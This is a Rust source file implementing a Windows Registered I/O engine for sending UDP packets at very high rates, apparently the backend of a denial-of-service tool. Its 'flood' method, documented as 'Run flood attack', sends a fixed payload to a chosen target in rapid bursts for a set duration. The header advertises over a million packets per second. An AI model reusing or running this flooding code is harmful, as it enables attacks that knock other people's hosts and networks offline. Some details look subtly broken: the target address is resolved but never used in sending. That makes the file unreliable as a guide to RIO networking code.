//! Windows Registered I/O (RIO) High-Performance Backend
//!
//! This module implements TRUE Registered I/O for Windows, bypassing the slow
//! Winsock/IOCP path entirely. RIO pre-registers memory buffers with the NIC
//! driver, eliminating per-packet overhead.
//!
//! Expected Performance: 1M+ PPS (vs ~200K with standard Winsock)
//!
//! Architecture:
//! - Pre-registered buffer pools (no per-packet memory locking)
//! - Completion queue polling (no kernel transitions)
//! - Zero-copy where possible
//! - Direct NIC ring buffer access

#![cfg(target_os = "windows")]

use std::ffi::c_void;
use std::io::{Error, Result};
use std::mem::{size_of, zeroed};
use std::net::{SocketAddr, ToSocketAddrs};
use std::ptr::{null, null_mut};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use windows_sys::Win32::Foundation::{BOOL, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Networking::WinSock::{
    closesocket, socket, WSAGetLastError, WSAIoctl, WSAStartup, AF_INET, IPPROTO_UDP,
    SIO_GET_MULTIPLE_EXTENSION_FUNCTION_POINTER, SOCKET, SOCKET_ERROR, SOCK_DGRAM, WSADATA,
};

/// RIO Extension Function Table GUID
const WSAID_MULTIPLE_RIO: windows_sys::core::GUID = windows_sys::core::GUID {
    data1: 0x8509e081,
    data2: 0x96dd,
    data3: 0x4005,
    data4: [0xb1, 0x65, 0x9e, 0x2e, 0xe8, 0xc7, 0x9e, 0x3f],
};

/// RIO Buffer ID type
type RIO_BUFFERID = *mut c_void;
type RIO_CQ = *mut c_void;
type RIO_RQ = *mut c_void;

/// RIO Buffer descriptor
#[repr(C)]
#[derive(Clone, Copy)]
struct RIO_BUF {
    buffer_id: RIO_BUFFERID,
    offset: u32,
    length: u32,
}

/// RIO Result structure
#[repr(C)]
#[derive(Clone, Copy)]
struct RIORESULT {
    status: i32,
    bytes_transferred: u32,
    socket_context: u64,
    request_context: u64,
}

/// RIO Extension Function Table
#[repr(C)]
struct RIO_EXTENSION_FUNCTION_TABLE {
    cb_size: u32,
    rio_receive: *const c_void,
    rio_receive_ex: *const c_void,
    rio_send: *const c_void,
    rio_send_ex: *const c_void,
    rio_close_completion_queue: *const c_void,
    rio_create_completion_queue: *const c_void,
    rio_create_request_queue: *const c_void,
    rio_dequeue_completion: *const c_void,
    rio_deregister_buffer: *const c_void,
    rio_notify: *const c_void,
    rio_register_buffer: *const c_void,
    rio_resize_completion_queue: *const c_void,
    rio_resize_request_queue: *const c_void,
}

/// RIO Send function type
type RioSendFn = unsafe extern "system" fn(
    socket_queue: RIO_RQ,
    p_data: *const RIO_BUF,
    data_buffer_count: u32,
    flags: u32,
    request_context: *const c_void,
) -> BOOL;

/// RIO Dequeue Completion function type
type RioDequeueCompletionFn =
    unsafe extern "system" fn(cq: RIO_CQ, array: *mut RIORESULT, array_size: u32) -> u32;

/// RIO Register Buffer function type
type RioRegisterBufferFn =
    unsafe extern "system" fn(data_buffer: *const u8, data_length: u32) -> RIO_BUFFERID;

/// RIO Create Completion Queue function type
type RioCreateCompletionQueueFn =
    unsafe extern "system" fn(queue_size: u32, notification_completion: *const c_void) -> RIO_CQ;

/// RIO Create Request Queue function type
type RioCreateRequestQueueFn = unsafe extern "system" fn(
    socket: SOCKET,
    max_outstanding_receive: u32,
    max_receive_data_buffers: u32,
    max_outstanding_send: u32,
    max_send_data_buffers: u32,
    receive_cq: RIO_CQ,
    send_cq: RIO_CQ,
    socket_context: *const c_void,
) -> RIO_RQ;

/// RIO Notify function type
type RioNotifyFn = unsafe extern "system" fn(cq: RIO_CQ) -> i32;

/// Pre-registered buffer pool for zero-copy operations
struct RioBufferPool {
    /// Raw buffer memory
    buffer: Vec<u8>,
    /// RIO buffer ID
    buffer_id: RIO_BUFFERID,
    /// Buffer size
    buffer_size: usize,
    /// Number of slots
    slot_count: usize,
    /// Slot size
    slot_size: usize,
    /// Next free slot
    next_slot: AtomicU64,
}

impl RioBufferPool {
    /// Create a new buffer pool
    fn new(slot_count: usize, slot_size: usize, register_fn: RioRegisterBufferFn) -> Result<Self> {
        let buffer_size = slot_count * slot_size;
        let mut buffer = vec![0u8; buffer_size];

        // Register buffer with RIO
        let buffer_id = unsafe { register_fn(buffer.as_ptr(), buffer_size as u32) };

        if buffer_id.is_null() {
            return Err(Error::last_os_error());
        }

        Ok(Self {
            buffer,
            buffer_id,
            buffer_size,
            slot_count,
            slot_size,
            next_slot: AtomicU64::new(0),
        })
    }

    /// Get a buffer descriptor for a slot
    fn get_buffer(&self, slot: usize, length: usize) -> RIO_BUF {
        RIO_BUF {
            buffer_id: self.buffer_id,
            offset: (slot * self.slot_size) as u32,
            length: length as u32,
        }
    }

    /// Get next available slot (round-robin)
    fn next_slot(&self) -> usize {
        let slot = self.next_slot.fetch_add(1, Ordering::Relaxed);
        (slot as usize) % self.slot_count
    }

    /// Write data to a slot
    fn write_slot(&mut self, slot: usize, data: &[u8]) -> usize {
        let offset = slot * self.slot_size;
        let len = data.len().min(self.slot_size);
        self.buffer[offset..offset + len].copy_from_slice(&data[..len]);
        len
    }
}

/// High-Performance RIO Engine
pub struct RioEngine {
    /// Socket handle
    socket: SOCKET,
    /// Completion queue
    completion_queue: RIO_CQ,
    /// Request queue
    request_queue: RIO_RQ,
    /// Send buffer pool
    send_buffers: RioBufferPool,
    /// RIO function pointers
    rio_send: RioSendFn,
    rio_dequeue: RioDequeueCompletionFn,
    rio_notify: RioNotifyFn,
    /// Statistics
    packets_sent: AtomicU64,
    bytes_sent: AtomicU64,
    errors: AtomicU64,
    /// Running flag
    running: AtomicBool,
    /// Target address
    target_addr: SocketAddr,
}

impl RioEngine {
    /// Initialize RIO and create engine
    pub fn new(target: &str, port: u16, buffer_count: usize) -> Result<Self> {
        // Initialize Winsock
        unsafe {
            let mut wsa_data: WSADATA = zeroed();
            if WSAStartup(0x0202, &mut wsa_data) != 0 {
                return Err(Error::last_os_error());
            }
        }

        // Create UDP socket
        let socket = unsafe { socket(AF_INET as i32, SOCK_DGRAM as i32, IPPROTO_UDP as i32) };

        if socket == INVALID_HANDLE_VALUE as SOCKET {
            return Err(Error::last_os_error());
        }

        // Get RIO extension function table
        let mut rio_table: RIO_EXTENSION_FUNCTION_TABLE = unsafe { zeroed() };
        rio_table.cb_size = size_of::<RIO_EXTENSION_FUNCTION_TABLE>() as u32;

        let mut bytes_returned: u32 = 0;
        let result = unsafe {
            WSAIoctl(
                socket,
                SIO_GET_MULTIPLE_EXTENSION_FUNCTION_POINTER,
                &WSAID_MULTIPLE_RIO as *const _ as *const c_void,
                size_of::<windows_sys::core::GUID>() as u32,
                &mut rio_table as *mut _ as *mut c_void,
                size_of::<RIO_EXTENSION_FUNCTION_TABLE>() as u32,
                &mut bytes_returned,
                null_mut(),
                None,
            )
        };

        if result == SOCKET_ERROR {
            unsafe { closesocket(socket) };
            return Err(Error::new(
                std::io::ErrorKind::Unsupported,
                "RIO not available on this system (requires Windows 8+/Server 2012+)",
            ));
        }

        // Extract function pointers
        let rio_send: RioSendFn = unsafe { std::mem::transmute(rio_table.rio_send) };
        let rio_dequeue: RioDequeueCompletionFn =
            unsafe { std::mem::transmute(rio_table.rio_dequeue_completion) };
        let rio_notify: RioNotifyFn = unsafe { std::mem::transmute(rio_table.rio_notify) };
        let rio_register: RioRegisterBufferFn =
            unsafe { std::mem::transmute(rio_table.rio_register_buffer) };
        let rio_create_cq: RioCreateCompletionQueueFn =
            unsafe { std::mem::transmute(rio_table.rio_create_completion_queue) };
        let rio_create_rq: RioCreateRequestQueueFn =
            unsafe { std::mem::transmute(rio_table.rio_create_request_queue) };

        // Create completion queue
        let completion_queue = unsafe { rio_create_cq(buffer_count as u32 * 2, null()) };

        if completion_queue.is_null() {
            unsafe { closesocket(socket) };
            return Err(Error::last_os_error());
        }

        // Create request queue
        let request_queue = unsafe {
            rio_create_rq(
                socket,
                0, // No receives
                0,
                buffer_count as u32, // Max outstanding sends
                1,                   // 1 buffer per send
                completion_queue,
                completion_queue,
                null(),
            )
        };

        if request_queue.is_null() {
            unsafe { closesocket(socket) };
            return Err(Error::last_os_error());
        }

        // Create buffer pool (1472 bytes per slot for MTU-optimized packets)
        let send_buffers = RioBufferPool::new(buffer_count, 1472, rio_register)?;

        // Resolve target address
        let target_addr = format!("{}:{}", target, port)
            .to_socket_addrs()?
            .next()
            .ok_or_else(|| {
                Error::new(std::io::ErrorKind::InvalidInput, "Invalid target address")
            })?;

        Ok(Self {
            socket,
            completion_queue,
            request_queue,
            send_buffers,
            rio_send,
            rio_dequeue,
            rio_notify,
            packets_sent: AtomicU64::new(0),
            bytes_sent: AtomicU64::new(0),
            errors: AtomicU64::new(0),
            running: AtomicBool::new(false),
            target_addr,
        })
    }

    /// Send a packet using RIO (zero-copy path)
    #[inline(always)]
    pub fn send_packet(&mut self, data: &[u8]) -> Result<()> {
        let slot = self.send_buffers.next_slot();
        let len = self.send_buffers.write_slot(slot, data);
        let buf = self.send_buffers.get_buffer(slot, len);

        let result = unsafe {
            (self.rio_send)(
                self.request_queue,
                &buf,
                1,
                0, // No flags
                null(),
            )
        };

        if result == 0 {
            self.errors.fetch_add(1, Ordering::Relaxed);
            return Err(Error::last_os_error());
        }

        self.packets_sent.fetch_add(1, Ordering::Relaxed);
        self.bytes_sent.fetch_add(len as u64, Ordering::Relaxed);

        Ok(())
    }

    /// Send burst of packets (high-throughput path)
    pub fn send_burst(&mut self, data: &[u8], count: usize) -> usize {
        let mut sent = 0;

        for _ in 0..count {
            if self.send_packet(data).is_ok() {
                sent += 1;
            }
        }

        // Dequeue completions to free slots
        self.process_completions();

        sent
    }

    /// Process completion queue
    fn process_completions(&self) -> u32 {
        let mut results: [RIORESULT; 256] = unsafe { zeroed() };

        let count = unsafe { (self.rio_dequeue)(self.completion_queue, results.as_mut_ptr(), 256) };

        count
    }

    /// Run flood attack
    pub fn flood(&mut self, packet_data: &[u8], duration_secs: u64, rate_limit: Option<u64>) {
        self.running.store(true, Ordering::SeqCst);

        let start = Instant::now();
        let duration = Duration::from_secs(duration_secs);

        // Calculate burst parameters
        let burst_size = 64; // Send 64 packets per burst
        let burst_delay = rate_limit.map(|r| Duration::from_nanos(1_000_000_000 * burst_size / r));

        while self.running.load(Ordering::Relaxed) && start.elapsed() < duration {
            // Send burst
            self.send_burst(packet_data, burst_size);

            // Rate limiting
            if let Some(delay) = burst_delay {
                std::thread::sleep(delay);
            }

            // Process completions periodically
            if self.packets_sent.load(Ordering::Relaxed) % 1000 == 0 {
                self.process_completions();
            }
        }

        self.running.store(false, Ordering::SeqCst);
    }

    /// Stop the engine
    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    /// Get statistics
    pub fn get_stats(&self) -> RioStats {
        RioStats {
            packets_sent: self.packets_sent.load(Ordering::Relaxed),
            bytes_sent: self.bytes_sent.load(Ordering::Relaxed),
            errors: self.errors.load(Ordering::Relaxed),
        }
    }

    /// Check if RIO is available on this system
    pub fn is_available() -> bool {
        // RIO requires Windows 8+ / Server 2012+
        #[cfg(target_os = "windows")]
        {
            use windows_sys::Win32::System::SystemInformation::{GetVersionExW, OSVERSIONINFOW};

            unsafe {
                let mut version_info: OSVERSIONINFOW = zeroed();
                version_info.dwOSVersionInfoSize = size_of::<OSVERSIONINFOW>() as u32;

                if GetVersionExW(&mut version_info) != 0 {
                    // Windows 8 is version 6.2
                    return version_info.dwMajorVersion > 6
                        || (version_info.dwMajorVersion == 6 && version_info.dwMinorVersion >= 2);
                }
            }
            false
        }

        #[cfg(not(target_os = "windows"))]
        false
    }
}

impl Drop for RioEngine {
    fn drop(&mut self) {
        unsafe {
            closesocket(self.socket);
        }
    }
}

/// RIO Statistics
#[derive(Debug, Clone)]
pub struct RioStats {
    pub packets_sent: u64,
    pub bytes_sent: u64,
    pub errors: u64,
}

impl RioStats {
    pub fn pps(&self, duration_secs: f64) -> f64 {
        if duration_secs > 0.0 {
            self.packets_sent as f64 / duration_secs
        } else {
            0.0
        }
    }

    pub fn mbps(&self, duration_secs: f64) -> f64 {
        if duration_secs > 0.0 {
            (self.bytes_sent as f64 * 8.0) / (duration_secs * 1_000_000.0)
        } else {
            0.0
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rio_availability() {
        let available = RioEngine::is_available();
        println!("RIO available: {}", available);
    }
}
